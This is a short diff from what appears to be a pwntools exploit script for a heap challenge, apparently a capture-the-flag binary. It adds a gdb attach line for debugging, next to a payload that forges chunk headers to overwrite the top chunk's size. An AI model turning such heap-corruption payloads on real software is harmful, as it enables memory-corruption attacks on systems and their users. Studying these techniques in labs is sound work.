@@ -37,6 +37,7 @@ def upgrade(Length,Name,Price,Choice):
     io.sendline(str(Choice))
 
 #OverWrite TopChunk
+gdb.attach(io)
 build(0x80,'AAAA',1,1)
 upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0x1)+p32(0x1f)+2*p64(0)+p64(0xf31),2,2)
 
